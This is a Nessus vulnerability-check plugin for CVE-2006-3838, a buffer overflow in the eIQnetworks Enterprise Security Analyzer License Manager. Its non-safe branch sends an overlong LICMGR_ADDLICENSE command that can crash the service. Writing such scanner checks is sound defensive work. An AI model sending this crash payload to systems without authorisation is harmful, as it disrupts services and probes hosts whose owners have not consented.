#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote host contains an application that is vulnerable to a remote
buffer overflow attack. 

Description :

The version of eIQnetworks Enterprise Security Analyzer, Network
Security Analyzer, or one of its OEM versions installed on the remote
host contains a buffer overflow in its License Manager service.  Using
a long argument to the 'LICMGR_ADDLICENSE' command, an unauthenticated
remote attacker may be able to leverage this issue to execute
arbitrary code on the affected host with LOCAL SYSTEM privileges. 

See also :

http://www.zerodayinitiative.com/advisories/ZDI-06-024.html
http://www.securityfocus.com/archive/1/441195/30/0/threaded
http://www.eiqnetworks.com/support/Security_Advisory.pdf

Solution :

Upgrade to Enterprise Security Analyzer 2.1.14 / Network Security
Analyzer 4.5.4 / OEM software 4.5.4 or later

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description)
{
  script_id(22129);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2006-3838");
  script_bugtraq_id(19163);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"27526");

  script_name(english:"eIQnetworks Enterprise Security Analyzer License Manager LICMGR_ADDLICENSE Command Buffer Overflow  Vulnerability");
  script_summary(english:"Tries to crash ESA license manager with a long LICMGR_ADDLICENSE command");
 
  script_description(english:desc);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Gain root remotely");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("esa_licmgr_detect.nasl");
  script_require_ports("Services/esa_licmgr", 10616);

  exit(0);
}


port = get_kb_item("Services/esa_licmgr");
if (!port) port = 10616;
if (!get_port_state(port)) exit(0);


# If safe checks are enabled...
if (safe_checks())
{
  build = get_kb_item("ESA/Licmgr/"+port+"/Version");
  if (build)
  {
    # Look at the product and build number.
    pat = "^([^ ]+) +v([0-9][^ ]+) +([^ ]+)";
    m = eregmatch(pattern:pat, string:build);
    if (m)
    {
      prod = m[1];
      ver = m[2];
      vuln = 0;
      if (prod == "ESA")
      {
        v = split(ver, sep:'.', keep:FALSE);
        if (
          int(v[0]) < 2 ||
          (
            int(v[0]) == 2 &&
            (
              int(v[1]) < 1 ||
              (int(v[1]) == 1 && int(v[2]) < 14)
            )
          )
        ) vuln = 1;
      }
      else
      {
        v = split(ver, sep:'.', keep:FALSE);
        if (
          int(v[0]) < 4 ||
          (
            int(v[0]) == 4 &&
            (
              int(v[1]) < 5 ||
              (int(v[1]) == 5 && int(v[2]) < 4)
            )
          )
        ) vuln = 1;
      }

      if (vuln)
      {
        report = string(
          desc,
          "\n\n",
          "Plugin output :\n",
          "\n",
          "Nessus has used the build version, ", ver, ", of the software on the\n",
          "remote host to determine that it is vulnerable to these issues.\n"
        );
        security_warning(port:port, data:report);
      }
    }
  }
}
# Otherwise...
else 
{
  soc = open_sock_tcp(port);
  if (soc) 
  {
    send(socket:soc, data:string("LICMGR_ADDLICENSE ", crap(1500)));
    res = recv(socket:soc, length:64);
    close(soc);

    # If we didn't get a response...
    if (isnull(res)) 
    {
      # Try to reconnect.
      soc2 = open_sock_tcp(port);
      if (!soc2) security_warning(port);
      else close(soc2);
    }
  }
}
